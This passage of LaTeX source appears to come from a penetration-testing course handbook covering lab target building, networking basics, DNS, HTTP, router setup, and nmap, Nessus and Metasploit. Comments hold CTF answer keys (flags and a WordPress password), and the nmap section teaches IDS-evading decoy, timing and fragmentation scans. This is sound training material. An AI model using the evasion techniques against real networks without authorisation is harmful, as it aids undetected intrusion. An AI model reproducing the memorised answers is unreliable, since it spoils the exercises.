					It is a Linux distribution that was designed to have most of the common tools used in network penetration built in. 
					Due to this, this OS the VM that most of your attacks come from. 
				\item[DVWA] The Damn Vulnerable Web App\footnote{\url{http://dvwa.co.uk/}} is one of the better web penetration learning platforms available. 
					It will allow the user to set the level of difficulty in a range of attacks that are similar, if not the same as those commonly found in the real world. 
				\item[Metasploitable] Metasploitable\footnote{\url{https://information.rapid7.com/metasploitable-download.html}} is a server setup to be exceptionally vulnerable. 
					It can be used to learn to attack through both web and network, making it a foundational system for creating a range. 
			\end{description}

			Further to these, the website \href{vulnhub.com}{volunhub} lists a number of community created VMs that can be stood up on your own machine as a target. 
			Many of these are built as a CTF, meaning that they have a number of vulnerabilities and challenges within them. 

	\section{Attack Environment}
	\section{Building Targets}
		While the basic targets found on the Internet are a good starting point, one must move beyond this if they are to learn properly how to gain access to real systems. 
		Thus, this section will explain how to build your own targets. 
		These targets may be easier or harder based on your goals, but they will be based on real, production software. 

		\subsection{Operating Systems}
			The first step in creating a vulnerable target is finding an OS to base it on. 
			This requires significant thought, requiring answers to the following questions:
			\begin{itemize}
				\item What type of attack do I want to practise?
					Practising domain attacks on most Linux systems will not be useful. 
					Similarly, Bind, a common DNS server, will not run on windows. 
				\item Does the attack require old software?
					If you need old versions of software, you may have to find their sources online. 
					However, some Linux distributions leave repositories for old software available online. 
					For example, debian 5's repository is still running on \url{archive.debian.org}.
				\item Is the attack configuration based?
					If this is the case, you can use any supporting OS, as you can mis-configure the software on any system. 
				\item Does the system I want to use have the required supporting libraries?
					DVWA for example, requires PHP 5.5, mysql and Apache. 
					If the system you are basing off doesn't have access to these packages, it will be far harder to set up the target. 
			\end{itemize}
		\subsection{Setup}
			Setting up a target system should be little different from setting up a production system. 
			However, there are two types of targets: specifically vulnerable and generally vulnerable:
			\begin{description}
				\item[Specifically Vulernable]
					These systems have been created to show a specific vulnerability, rather than generally be vulnerable. 
					Creating a system like this means that the attacker will have to undertake a specific set of research
					and attack through the medium that you designed. 
					The main purpose of these systems is to teach a specific type of attack or demonstrate a given vulnerability. 
				\item[Generally Vulnerable]
					These systems are the more common type of target system. 
					They can be useful for teaching a number of different types of vulnerability, meaning that they can be reused for many different lessons. 
					Targets such as Metasploitable fall into this category, as they have a number of vulnerabilities that the attacker could choose to exploit. 
			\end{description}

			The setup for these types of target however, is quite similar. 
			The only differing requirements are that specific targets need more planning, and general targets need the same process to be completed for multiple services. 

			The first step to creating a target, given that the OS has been installed and configured is to install the relevant packages for the vulnerability that you require. 
			If this can be found in the repositories of the distribution or system that you are using, download them from here. 
			Otherwise, vulnerable versions of software can be found on \href{https://www.exploit-db.com/remote/?order\_by=application&order=desc&pg=1}{exploit-db.com}.

			From here, the software should be configured as per it's manual or online guides. 
			However, there will be a number of places that it is evident will have an impact on security. 
			If the software has not been chosen for an explicit vulnerability found within it, you should research theses settings and configure them to provide the level of exposure and ease of access that you desire. 

			After configuring the software and starting the relevant services, you should scan the VM as if you were about to attack it. 
			This will tell you if there was anything that you missed from your initial design or any components that could be improved. 

	\section{Target Environment}
		This section serves as an overview of an example target environment. 
		This environment was designed to cover as wide a range of scenarios as possible, but is still far from extensive\cite{CTFBlueprints}.

		The information provided here is a setup guide for these VMs, explaining how the example target network was created. 
		\subsection{Debian Name Server}
			This VM is one of the core systems on the network. 
			It provides name services for the whole network, under the ``.cysec'' top level domain (TLD).

			Thus, the main configuration item on this system is bind. 
			\subsubsection{bind}
				Running the DNS services on this server is bind9. 
				While this is the current major release of bind, it is a version from 2012. 
				Furthermore, this version has a number of configuration errors within it, making it vulnerable to zone transfers amongst a multitude of other issues. 

				The bind configuration is as follows:
				\lstinputlisting[language=bind]{./shellOut/named.conf}

				This then links to the following two configuration files:
				The master cache:
				\lstinputlisting[language=bind]{./shellOut/master.db}
				The reverse cache:
				\lstinputlisting[language=bind]{./shellOut/10.1.1.rev}

				Look through these files. 
				They have opened the system to a number of vulnerabilities, enabling an attacker to both retrieve and poison DNS for the whole network. 

			\subsubsection{Nmap}
				The following is an nmap scan of the name server:
				\lstinputlisting[language=nmap]{./shellOut/ns.cysec.nmap}
		%---------------CTF Answers--------------
		% Zone transfer: flag-ZoneTransfersAreFun-flag.cysec.
		% Reverse Gateway: flag-checkTheGateway-flag.cysec.
		%------------End CTF Answers-------------
		\subsection{Debian Wordpress Blog}
			This VM is the main web server on the network. 
			It provides a blog, with a number of vulnerabilities, as well as a poorly secured services such as mail and telnet. 

			%--------CTF Answers----------------
			% www-data email: flag_{He sees you when you're sleeping, he knows when you're awake, he's copied on /var/spool/mail/target, so be good for goodness' sake.}
			% root(target) email: flag_{So you can take hints}
			% WP User Password: cerecita % found in head -n 100000 rockyou.txt
			% WP Draft: Flag_{Wordpress_Security}
			%------End CTF Answers---------------

			\subsubsection{Vulnerabilities}
				This section will go over the vulnerabilities on the system based on their type and location. 
				While not every vulnerability has a flag directly attached to it, they can all be used to gain better access to the system, leading the attacker to have more chance of finding flags. 
				\paragraph{Wordpress}
					The Wordpress blog on this site has a number of vulnerabilities:
						\begin{itemize}
							\item Version is out of date.
							\item Jetpack plugin is vulnerable to SQL injection\footnote{\url{https://www.exploit-db.com/exploits/18126/}}.
							\item Mobile Detector plugin is vulnerable to arbitrary file uploads\footnote{\url{https://www.exploit-db.com/exploits/39891/}}.
							\item Simple Backup plugin is vulnerable to arbitrary file downloads\footnote{\url{https://www.exploit-db.com/exploits/39883/}}.
							\item Ghost Export plugin is vulnerable to unrestricted export downloads\footnote{\url{https://www.exploit-db.com/exploits/39752/}}.
							\item Import CSV plugin vulnerable to directory traversal\footnote{\url{https://www.exploit-db.com/exploits/39576/}}.
							\item ABtest plugin is vulnerable to local file inclusion\footnote{\url{https://www.exploit-db.com/exploits/39577/}}.
						\end{itemize}
					
			\subsubsection{Nmap}
				The following is an nmap scan of the web server:
				\lstinputlisting[language=nmap]{./shellOut/ns.cysec.nmap}



\chapter{Network Operations}
	\label{ch:NetworkOperations}
	By using a common language and being able to write it down, the human race has been able to move from hunter gather to large scale society. 
	Language has allowed us to communicate the skills which our forebears learned to their children, eventually to us. 
	In a similar manner, computers need a means of communicating. 
	This is where networking and the OSI model for computer communications comes in, they allow computers to become more than just the machine in front of you. 
	Networking has become commonplace---many people would find no use in a computer without it---and many of our most used programs depend entirely on it. 
	However, to understand how to exploit networking, we need to understand how the communication takes place, how the network has been created and how to connect to the services running on other machines in ways they may not have been designed for. 
	\section{OSI Model}
		When computers are communicating, they need to be able to speak in the same language.\cite{HackingAOE} 
		However, if a programmer needed to implement this every time they required network communication, we would never achieve communication between two systems.\footnote{\url{https://xkcd.com/927/}} 
		Due to this, the OSI Model was created. 
		The OSI model provides the standards for all levels from the application currently being used to the bare metal the data is sent over. 
		These standards allow the relevant equipment to focus on the necessary parts of their implementation, while the other parts are taken care of, allowing for easier communication between unlinked programs. 
		The layers of the OSI Model are as follows:
		\begin{description}
			\item[Physical Layer]
				Deals with the physical connection between two machines through means such as CAT5 Ethernet. 
				This is the lowest layer, whose primary role is communicating raw bits, as well as starting maintaining and ending the transmission. 
			\item[Link Layer]
				Transfers data between the two points connected by the physical layer. 
				This layer provides some high level functions which allow for error correction and flow control. 
				It also provides a means of activating, maintaining and ending the link. 
				This is the layer that a switch would sit on, 
				using the MAC addresses of the connected devices to direct traffic to the correct device. 
			\item[Network Layer]
				Provides a means of transmitting datagrams from one machine on the network to another. 
				This is the layer where network addresses (IP) are translated into a physical machine address. 
				This is the layer that routers work on, allowing them to direct a packet to the correct machine based on IP address. 
				Due to this, you do not have to specify each hop required for a packet to get to a destination. 
			\item[Transport Layer]
				Provides transparent transfer of data by allowing reliable communication and known protocols. 
				This layer means that higher layers need not worry about reliability of connection. 
				This is implemented though means such as TCP and UDP, both of which have different requirements and functions for transport and error checking. 
				This layer works on maintaining the integrity of individual messages. 
			\item[Session Layer]
				Responsible for establishing and maintaining connections between applications. 
				While the transport layer deals with messages, the session layer works on the ongoing connection between the computers. 
				This would usually deal with multiple messages, and numerous packets. 
				Usually this is implemented in a socket by the OS. 
			\item[Presentation Layer]
				Presents the data to the application which is is being communicated to in a format which is understandable to the application. 
				This is the layer which allows for encryption and data compression. 
				This means that the application itself need not be sending encrypted messages to have secure communications. 
				Instead, it could be wrapping its communication socket in a TLS session which would be securing the communications for it. 
			\item[Application Layer] 
				Keeps track of the requirements of the application and allows it to utilize the data which it received. 
				This is where the data is read into the memory of the program and released to it. 
				This allows the program to interpret and act on the data, giving it to the user or changing how it acts based on it. 
		\end{description}
		When data is transmitted through these layers, it is encapsulated in quanta known as packets. 
		Each of these packets contains the meta-data required for each of the layers of the network model. 
		Starting from the application layer, each layer that the packet passes through will add a new header for it's data, which will not be read until the packet passes through that layer on the other end of it's journey. 
		%TODO: Think about using a figure here to show this encapsulation. 
		This layered nature allows us to connect using sockets, handling only the application and presentation layers and allowing the OS to sort the rest for us.

		It is important to note that each layer of the OSI model need not understand the layers around it. 
		Those below will encapsulate the data within their headers and requirements, while those above will simply send their data to the lower layer. 
		Furthermore, each layer communicates only with the corresponding layer on the other machine. 
		Thus, TCP communicates with TCP and applications communicate with applications. 
		Due to this, layers above can be removed from the stack if not required. 
		However, this is a rare situation, occurring only in situations such as ping. 

		Network architecture is the physical layout of the computers connected using the aforementioned OSI model. 
		This is done through means of routers, switches and hubs connecting computers. 
		Each of these components are known as nodes within the network. 
		Nodes are any item along the way that will receive and either terminate or retransmit data. 

	\section{TCP/IP Model}
		Much like the OSI Model, the TCP/IP model was created in order to standardise the way that computers communicate.\cite{ICND1}
		However, this model was created by the DoD, and has become the model that is used in the modern world. 
		It follows a similar idea to the OSI Model, and the same terms are often used to discuss the TCP/IP model, even though they aren't a part of the specification. 
	
		The TCP/IP Model was created through two means, finding other standards to use or creating Request for Comments submissions. 
		The former of these is the way that the Ethernet standard (IEEE 802.3) was added. 
		The latter is what was used to create the protocols and structure of the model. 

		The layers of the TCP/IP Model can be found in Table \ref{tab:TCPIPModel}
		\begin{table}[htb]
			\centering
				\begin{adjustbox}{max width=1\textwidth}
			\begin{tabular}{| l | l |}
				\hline
				\textbf{TCP/IP layers} & \textbf{Focus of Layer}\\ \hline
				Application & Application data to be sent or recieved\\ \hline
				Transport & Transmission assurance and error recovery\\ \hline
				Network & Data delivery along whole path\\ \hline
				Data Link & Individual link delivery\\ \hline
				Physical & Physical make up of the network\\ \hline
			\end{tabular}
		\end{adjustbox}
			\caption{TCP/IP Networking Model}
			\label{tab:TCPIPModel}
		\end{table}

		The Layers of the TCP/IP Model cause one of two types of interaction to occur. 
		\begin{description}
			\item[Same Layer Interaction:] Interaction between machines on the same layer of the TCP/IP Model. 
				This is used to transmit data between machines. 
				Only the layer that sent a particular piece of data will read that data. 
			\item[Adjacent Layer Interaciton:] Interaction between layers on the same machine. 
				This is used to encapsulate data from a higher layer or deliver data from a lower layer. 
				This is used as each layer needs the services of the layer below it in order to send the packet and have it received at the destination. 
		\end{description}

		The TCP/IP Model also specifies the manner in which IP will be used. 
		This allows it to control routing within a network as large as the internet, 
		ensuring that it has a way to get a packet from a source to the destination. 

		This is done using IP routing and subnetting, which lets nodes along the route know approximately where to send a packet. 
		This process leads to the packet eventually being received by a node that is within the same LAN as the destination and forwarding it to it. 

	
	\section{Connecting to Networked Software}
		There are a number of pieces of networked software available. 
		These are often designed to be accessed in a specific manner, however, these can also often be accessed though other tools. 
		Often, you will have one end of a program, usually the server running on another machine. 
		This means that you will have to connect to the in a manner which they were not designed for, 
		reverse engineering the protocol until you have something that works. 

		\subsection{Netcat}
			The first method of doing this is using the tool Netcat or ``ncat''. 
			This tool will connect you to a port, sending any line that you type and printing anything received. 
			This will allow you to connect directly to any networked program with an open port.
			This means that you can determine how the program works, reverse engineering it in order to write your own client for it or access the data it contains. 

			To use this, run the command ``ncat <target> <port>''. 
			This will give you a basic socket connection as previously described to whatever program is working on the given port of the remote machine. 
			You can use ncat for other means, such as creating a shell on another computer. 
			However, this is outside the scope of this section. 
			Further information can be found on the \href{https://nmap.org/book/ncat-man.html}{Ncat Reference Guide}

		\subsection{Programming an Interface}
			This is the means of taking a server application that you have reverse engineered and implementing a client for it. 
			This will give you a usable interface which will automatically interact with the server. 
			Using this will allow you to automate functions such as handshakes and challenge-response sequences. 

			Using the python code learned in Chapter \ref{ch:Programming}, 
			you should be able to write a simple socket script which will respond for you or give you a useful prompt when working with networked software. 

			To test this, set up the \href{https://github.com/CySCA/CySCA2014/blob/master/misc-server/programming/prog01/server.py}{jumbled word server} from \href{https://cyberchallenge.com.au/}{CYSCA 2014} and attempt to write a python script which will run through the challenge response sequence for this server. 

		\subsection{Hidden Services}
			Some services either remain hidden, or refuse to answer until a given task has been completed. 
			The main example of this is port knocking, which forces a user to attempt to connect to a number of ports before the correct one will open. 
			This was created as a means of avoiding port scans, as the ports that are to be used for communications will be closed during the scan. 
			However, it requires either that a process is monitoring the firewall logs, or that the firewall itself is changing based on traffic. 

			This is commonly implemented on ports such as 22 (SSH), which is often a target for brute forcing. 
			The user will set the required ports before enabling the service, opening the SSH port only when the correct sequence has been contacted. 

			Generally, there is no way to determine the sequence required. 
			However, if you are able to read the code being run on the server, you should be able to reverse engineer this sequence and gain access. 

	\section{Domain Name System}
		The Domain Name System (DNS) is the method that is used to translate between domain names such as ``example.org'' to IP addresses such as ``93.184.216.34'' (IPv4) or ``2606:2800:220:1:248:1893:25c8:1946'' (IPv6).
		Without this system, the Internet would be significantly more difficult to navigate, with the dynamic allocation of IP addresses making it impossible to find the same website after reallocation. 
		DNS on the client side makes it possible to access sites by name, removing the need to remember the address and account for its possible changes. 
		However, on the server side, it can be used for numerous activities such as load balancing and regional direction. 

		\subsection{Structure of the Domain Name System}
			DNS is broken down into a number of parts, each of which have authority over a given area. 
			This structure can be thought of as a tree, with each branch delegated responsibility for it's given area. 
			An example of such a tree structure can be found in figure \ref{fig:DNSTree}.

			\begin{figure}[htb]
				\centering
					\includegraphics[scale=0.27]{./DNSTree.png}
					\caption{A depiction of DNS for an Internet like network}
					\label{fig:DNSTree}
			\end{figure}

			Within each zone, as indicated by the dashed lines, the top most node is authoritative over the records within that zone. 
			This means that that particular server is the one that is able to reply with the IP address of the name you are looking for, if said name resides within the zone. 
		\subsection{Resolving a Name}
			The process to resolve a name involves a number of steps and a number of servers. 
			Later, we will see that many of these steps can be removed, but it is useful to understand the full system. 
			The servers that will be used are as follows:
			\begin{enumerate}
				\setcounter{enumi}{-1}
				\item Root server (``.'')
				\item TLD server (``.com'')
				\item Authoritative server (``example.com'')
			\end{enumerate}
			The following domain levels will be used in this example:
			\begin{center}
				\begin{tabular}{| c | c | c | c |}
					\hline
					\textbf{Subdomain} & \textbf{Domain} & \textbf{Top Level Domain} & \textbf{Root Domain} \\ \hline
					www & example & com & . \\ \hline
				\end{tabular}
			\end{center}
			The following steps will then be taken to resolve the domain name ``www.example.com'':
			\begin{enumerate}
				\item The Resolver will query a preconfigured root server with ``www.example.com''. 
				\item The Root server will reply with the domain name of the ``.com'' TLD Server.
				\item The Resolver will query the TLD server with ``www.example.com''.
				\item The TLD server will reply with the domain name of the ``example.com'' DNS server. 
				\item The Resolver will query the example.com DNS server with ``www.example.com''. 
				\item The example.com server will reply with the IP address of ``www.example.com'' and that it is the authoritative server for this domain. 
			\end{enumerate}
			It is however, not necessary to go through all of these steps. 
			If we were asking for the address of ``x.y.z.example.com'', the example.com server could respond with the address for this domain if it were configured to be the authoritative DNS server for each of those subdomains. 
			Graphically, such a process would look similar to that shown in figure \ref{fig:DNSRecursor}.

			\begin{figure}[htb]
				\centering
					\includegraphics[scale=0.27]{./DNSRecursor.png}
					\caption{A depiction a of recursive DNS lookup}
					\label{fig:DNSRecursor}
			\end{figure}

			Conducting this process for every domain required by the user would result in the root servers and more common TLD servers being overwhelmed by traffic. 
			Furthermore, the resolve times for such a system would be prohibitively long. 
			Due to this, a caching system has been developed to allow many steps of this process to be skipped. 
			This process would likely remove at least the first two steps, but may also remove the third and fourth for more common sites, or sites that the user has accessed recently. 
			Furthermore, a local cache may contain the exact IP address for the site if it has been accessed within the TTL value. 

			When accessing a remote cache, the DNS query may look somewhat like that seen below:
			%TODO: Why is the following not indenting as shown in the source
				\lstinputlisting[numbers=none]{./shellOut/DNSQuery.out}
			The corresponding response may look as follows:
				\lstinputlisting[numbers=none]{./shellOut/DNSResponce.out}
			
			This caching process has been implemented into the DNS structure though the use of Time To Live (TTL) values. 
			This allows the server administrator to set the duration for which a cache can store the address to domain mapping of their server. 
			However, this also means that if their IP address were to change, the TTL would have to be lived out before DNS started pointing at the new IP. 
		\subsection{Protocol Extensions and DNSSEC}
			DNS has been updated to support a number of extensions. 
			These, when unused do not have any overhead on the system. 
			However, when used, they can provide a significant improvement to the system. 
			One such extension is the DNSSEC extension, which provides some security against DNS cache poisoning and other attacks. 

			DNSSEC works through authenticating the packets using digital signing to ensure that the packet came from the server that it was reported to come from. 
			However, this process does not provide any encryption, meaning that DNS packets are readable by anyone sitting between the communicating computers on the network. 

	\section{Hyper Text Transfer Protocol}
		HTTP is a common protocol working on the application layer of the OSI model. 
		This protocol forms the basis for the section of the Internet known as the ``world wide web''. 
		Generally, this protocol would work with the following steps:
		\begin{enumerate}
			\item Client makes request of a server.
			\item Server receives request and returns the requested data along with a status code. 
			\item Client receives and loads data.
		\end{enumerate}

		This simple form can be extended upon by changing what the HTTP server acts upon. 
		For example, a simple PHP site could use the user agent to display a slightly different site to a different browser. 

		HTTP uses the following methods for requesting and sending information:
		\begin{description}
			\item[GET] Requests a resource. These should only retrieve data. 
			\item[HEAD] Identical to the GET method, but without the response body. 
				Useful for meta-information without getting the whole body. 
			\item[POST] Requests that the server accept the data within the request as a subordinate of the URI given. 
				This might be a forum or bulletin board post or data from a web form. 
			\item[PUT] Requests that the data enclosed be stored under the supplied URI. Should modify existing resources. 
			\item[DELETE] Should delete the specified resource. 
			\item[TRACE] Echo back the received request so that the client can determine if intermediaries have altered the request. 
			\item[OPTIONS] Returns the methods that the server supports. 
			\item[CONNECT] Used to connect to HTTPS sites using SSL/TLS through an unencrypted proxy. 
			\item[PATCH] Applies partial modifications to a resource. 
		\end{description}

		Each of these methods has a request and response section, 
		designed to inform either side that the work has completed, as well as sending any required data. 
		Furthermore, to allow interacting programs to understand what has happened on the server, 
		a set of status codes has been created\footnote{\url{http://www.w3.org/Protocols/rfc2616/rfc2616-sec10.html}}. 
		A short list of these is as follows:
		\begin{description}
			\item[2xx] These are the success codes. 
			\item[200] Request has succeeded. Information returned will depend on method used in request. \\
				\textbf{GET:} Corresponding resource sent. \\
				\textbf{HEAD:} The header for the corresponding resource sent. \\
				\textbf{POST:} Entity describing or containing the result of the action. \\
				\textbf{TRACE:} The request message as received by the end server. \\
			\item[201] The request has been fulfilled and resulted in a resource being created. 
			\item[202] The request has been accepted for processing, but has not yet been completed. 
				The client may disconnect, as it will not get another update. 
			\item[3xx] Redirection. 
				This may result in the client taking action to solve the problem for either GET or HEAD requests. 
				Clients should notice and stop infinite redirection. 
			\item[300] There are multiple redirection choices. 
				The user or client should determine which resource should be accessed. 
			\item[301]] Moved permanently. 
				The resource has a new URI, which has been returned in the response body. 
				Client should now move to the new URI. 
			\item[4xx] Client error.
				This is where the clients request does not make sense to the server. 
			\item[400] Bad Request. 
				The request that has been sent contained malformed syntax.
			\item[401] Unauthorised. 
				The current request requires authentication before it can be served. 
			\item[402] Payment Required.
				The request is for a site that is behind a pay wall without the client having paid. 
			\item[403] Forbidden. 
				The server understood but is refusing to fulfill the request. 
				This is lie 401, but authorisation will not change the servers stance. 
			\item[404] Not Found. 
				This status will be returned if the requested URI does not point to a resource. 
			\item[405] Method not allowed. 
				The method used is not allowed for the given URI. 
				The response will include an Allow header containing the valid methods. 
			\item[410] Gone.
				The URI requested has been moved or deleted. 
			\item[5xx] Server Error
			\item[500] Internal server error.
				Server encountered an unexpected condition while processing. 
			\item[501] Server does not support the function requested. 
		\end{description}
	\section{Challenges}
		\subsection{Building a Router}
			This section will take you through the process of building a router on top of a Linux system. 
			This will be a basic router, capable of NAT and packet forwarding, and expandable to contain multiple interfaces and devices such as firewalls. 
			To start this, a number of conventions should be set out:
			\begin{description}
				\item[intern0] The internal pointing network interface. 
					This device points at the LAN. 
				\item[extern0] The external pointing network interface. 
					This device points at the WAN. 
			\end{description}
			When these devices are seen within the configuration of this section, replace them with the equivelent name from your device. 

			\subsubsection{Configuring the Interfaces}
				The interfaces that you will be using for this need to be configured for the setup that you will be using. 
				This can be done through ``netctl'' and the following configuration files:
				File at /etc/netctl/extern0-profile should contain:
				\lstinputlisting[numbers=none]{./shellOut/extern0-profile}
				File at /etc/netctl/intern0-profile should contain:
				\lstinputlisting[numbers=none]{./shellOut/intern0-profile}
				
				
				You will then want to bring these interfaces up using the following commands:
				\begin{lstlisting}[style=CLI]
					$ netctl enable extern0-profile
					$ netctl enable intern0-profile
				\end{lstlisting}

			\subsection{Set up DNS and DHCP}
				You will then want to set up the DNS and DHCP services. 
				The former of these allows your internal machines to communicate with external name servers. 
				The latter allows your router to provide IP addresses to the internal machines. 
				Add the following to the top of ``/etc/dnsmasq.conf'':
				\lstinputlisting[numbers=none]{./shellOut/dnsmasq.conf}
			\subsection{Set up NAT}
				Network Address Translation is the key utility that allows you to communicate through the router. 
				This will allow you to send and receive data through it, and with some configuration, receive incoming connections. 
				In order to set this up, run the following commands in order: 
				\lstinputlisting[style=CLI]{./shellOut/iptablesNat.in}
				I recommend putting these commands into a script file and running that. 
				That way, if you have to make any changes to them or add any new rules, you can put them in the correct place and run the file. 
				Use the command ``iptables -F'' to clear the table before running the script. 

			\subsection{Bring up the services}
				The services that are required will now have to be brought up and enabled for boot. 
				This can be done using the following commands:
				\begin{lstlisting}[style=CLI]
					$ systemctl start dnsmasq
					$ systemctl enable dnsmasq
				\end{lstlisting}
				Furthermore, for information on how the service is running, run the command ``systemctl status dnsmasq''. 

			\subsection{Conclusion} 
				You should now have a fully working router. 
				This can be tested by plugging another machine into the internal interface and attempting to access the WAN. 

				Furthermore, you can continue to configure the router. 
				You may wish to look into firewalls, content filtering, port forwarding, wireless interfaces, packet inspection and SSL offloading in a further attempt to create a secure router and a Cyber Security Operation Center (CSOC) like environment. 
				
\chapter{Network Penetration}
	\label{ch:NetworkPenetration}
	Network penetration is a multi phase process, starting at information gathering with tools such as nmap and Nessus, and moving on to gaining and maintaining a presence through exploitation. 
	This chapter will show a step by step progression through this, explaining how an attacker would find their target on a network, exploit it and move on to another target without losing control of the first machine. 
	\section{Nmap}
		Port scanning is a simple way to determine what services are running on a computer. 
		This can be done due to the fact that most programs run on a known port specified in their documentation. 
		However, it also works by fingerprinting the response, which is usually specific to the program which is running on the port. 
		This can be done through a number of means, such as attempting to open a full TCP connection to each port or only attempting a partial connection. 
		It must be noted that while effective, the former is rarely used due to the ease of detection and large amount of network traffic generated. 
		Nmap\cite{NmapBook} is the tool that we will utilize to conduct these scans. 
		It has a number of options which allow us to control the scan to our exact specifications and commonly picks up most services.\cite{HackingAOE} 
		\subsection{SYN Scanning}
			The most common scan used is known as a SYN scan. 
			This will send TCP SYN packets to the specified ports on the target computer, listening for the SYN/ACK response. 
			If a SYN/ACK packet is received, the port is marked as open, the packet is examined for service fingerprinting and an RST packet is sent to stop the connection and prevent accidental DoS. 
			Using nmap, the ``-sS'' flag is used to run a SYN scan. 
			\begin{lstlisting}[style=CLI]
				$ nmap -sS <Target IP>
			\end{lstlisting} 
			This will output all of the services which are found to be running on the remote system. 
			A sample output of an nmap SYN scan can be seen below. 
			Note that this is an exaggerated response, as the target scanned was intentionally vulnerable. 
			\lstinputlisting[language=nmap]{./shellOut/nmapSYN.out}
		\subsection{Other Scan Types}
			While SYN scanning is useful, it has become easier to detect due to the introduction of IPS with partial connection rules. 
			These systems will see a number of partial connections within a given time and will lock out the address that the connections came from, effectively halting your scan. 
			To combat this, a number of other scan types have been created, each exploiting some part of the network standard. 
			These newer scans work by sending a TCP packet which doesn't make sense to each port. 
			When these packets are received by a service, they will be ignored. 
			However, when the OS receives them on a closed port, it will often reply with a RST packet. 
			This difference can be used to determine which ports are open. 
			This will work on any system which follows the RFC793 standard. 
			Most *nix systems following this, however, windows does not. 
			\begin{description}
				\item[FIN scan]
					sends a FIN packet. 
					Used by specifying ``-sF'' in nmap. 
				\item[X-mas scan]
					sends a packet with FIN, URG and PUSH flags on.
					Used by specifying ``-sX'' in nmap. 
				\item[null scan]
					sends a packet with all flags off. 
					Used by specifying ``-sN'' in nmap. 
			\end{description}
			These scans will generally give you exactly the same output as the SYN scan, except where RST replies are not sent or where SYN scans are blocked by a firewall. 
			When you don't care about hiding and would like as much information as possible, all nmap scans can be integrated by using the ``-A'' option. 
			This will turn on all scanners, taking significantly more time and producing significantly network noise, however, you will receive detailed information on the services and OS running on the target. 

		\subsection{Other Means of Hiding}
			By default, many of these scans can be both loud and obvious to the trained eye or IDS.\footnote{\url{https://nmap.org/bennieston-tutorial/}} 
			Thus, nmap also comes with a set of flags which will enable you to attempt to hide the most obvious parts of the scan. 
			These, when used well will allow you to run an scan which will not be noticed by most of the IDS which are on the market today. 

			By default, nmap adjusts it's timings based on network speed and the response times of the target. 
			However, you are able to adjust these timings in order to either avoid detection or have the scan complete as quickly as possible. 
			These start with the ``-T0'' or paranoid scan, which will send packets at 5 minute intervals. 
			This timing will likely not be picked up by an IDS, nor by after the fact analysis due to the fact that random Internet traffic usually presents this number of invalid packets. 
			On the other end of the spectrum is the ``-T5''  or insane scan. 
			This scan will map a network exceptionally fast, but will trip most IDS systems and will be obvious in logs. 
			Furthermore, if you are on a slower network connection, it is possible that this scan will fail or drop data due to the high data rate required. 
			Further adjustment to specific parts of timings can be made, but this is usually not necessary. 
			See the nmap manual for more information on these. 

			If you are attempting to hide that you are the attacker, the decoy option ``-D'' will allow you to specify a number of IP addresses from which it will seem the attack originates.
			While this will not hide your own address, it will place it within a swath of other information, making it difficult to determine the original attacker. 
			Furthermore, when looking at logs, the target will assume that they were being scanned by a large number of hosts, causing them to worry about the potential future attacks. 

			For another level of stealth, ICMP pings can be turned off.
			These will make the scan less likely to be picked up in as the machines being scanned will not have a ping going out to test whether they are up first. 
			Furthermore, it will allow nmap to scan all hosts, rather than just those responding to ping. 
			When using this flag, you can also specify flags such as ``-PT'' or ``-PS'' which will send a TCP or SYN ping respectively. 
			There are a number of options for ping within nmap scans. See the ``-Px'' flags within the nmap manual. 

			A final option for bypassing firewalls is to use the fragment or ``-f'' option. 
			This will split every packet sent to the target into a number of small packets, which many firewalls will not attempt to reassemble before scanning them. 
			While this means that you are more likely to get past the firewall, it also can crash some less stable software and hardware. 
			Thus, this should be used with care, as crashing computer systems are exceptionally noisy. 
	\section{Nessus}
	%http://www.securitylearn.net/tag/nessus-tutorial/
		Nessus is an exceptionally powerful vulnerability scanner. 
		It works by first conducting a port scan on the target computer, than attempting to fingerprint all open ports. 
		This allows Nessus to provide a detailed output of the likely vulnerabilities that exist on the system as well as the CVEs that relate to them. 
		It is this knowledge base and the detail that can be found within it that has made Nessus as popular as it currently is. 
		
		\subsection{Installing and Running Nessus}
			Download the \href{http://www.tenable.com/products/nessus-vulnerability-scanner}{Nessus installer}
			from Tenable and run it. 
			At this point you can start Nessus. On Kali, this is done by running the command ``/etc/init.d/nessusd start''. 
			Then in your browser, open the web page ``https:localhost:8834''. 
			This will give you the start page for Nessus. 
			Following the steps outlined on the screen will get you to a usable Nessus install. 

		\subsection{Running a Scan}
			Nessus comes with a number of pre-built scan types which work for different types of systems. 
			These are described below:
			\begin{description}
				\item[External Network Scan] This scan is written for externally facing hosts. 
					It will scan all ports on the host, as well as having a number of plugins configured for scanning for items such as XSS. 
				\item[Internal Network Scan]
					Configured for large internal networks, this scan will scan all standard ports expecting workstation, server and embedded machines. 
				\item[Web Application Tests]
					This scan is designed to detect common vulnerabilities in Web Applications. 
					It will spider the site and discover both the content and the links within the application. 
					Once this spider is complete, Nessus will attempt to determine the vulnerabilities which exist within the pages found. 
				\item[PCI DSS Audit]
					This scan is built to determine whether a system is vulnerable to a security risk which is explicitly stated within the Payment Card Industry Data Security Standards. 
					While it does not guarantee not to find false reports, it will pick up a number of the basic vulnerabilities which must be fixed before a PCI DSS Audit. 
			\end{description}
			At this point, you can select the new scan button and select the scan which will work best for your goals. 
			You will be directed to the new scan page, which will allow you to detail the targets which you are pointing the scan at. 
			The common subneting notations work within this box, allowing you to specify a range of IP addresses. 

			Once you have selected your target, you can customize the scan using the other tabs down the left of the page. 
			This will allow you to alter default settings such as the ports which will be scanned and the verbosity of the report which will be generated. 
		\subsection{The Report}
			Once the scan has completed, you will be able to see the results under the completed scans tab. 
			This page will give you a breakdown based on the severity of the possible vulnerability of what could be targeted on the scanned machine. 
			Selecting an individual vulnerability will give detail about both the method used to scan it, and possible methods used to exploit it. 
			Some vulnerabilities will also come with links to the CVE that was given to it's report and a set of possible mitigations. 

			It is worth noting that the existence of a vulnerability report here does not mean that the vulnerability exists on the target system. 
			Rather it is only an indication that something that fingerprints similarly to the expected vulnerability exists. 
			Thus, a vulnerability found within this report cannot be regarded as an actual entry point, further testing and an actual penetration is required. 
	\section{Metasploit}
		Metasploit is a framework for creating and launching attacks on other machines.\footnote{\url{https://www.offensive-security.com/metasploit-unleashed/}} 
		It was initially created due to the lack of modularisation in attacks in the early 2000's. 
		It has since allowed for those crafting attacks to focus on exploiting the software, allowing a multitude of payload and connection options to be incorporated into the exploit. 
		Due to this, Metasploit was created with a step by step usage. 
		This will be explained in the following section. 

		Before following any of these steps, you will have to have used Nmap and Nessus to gather a list of possible vulnerabilities. 
		Using these, you can determine which exploit modules may be useful. 
		However, without it, you will simply be producing noise on the target network. 
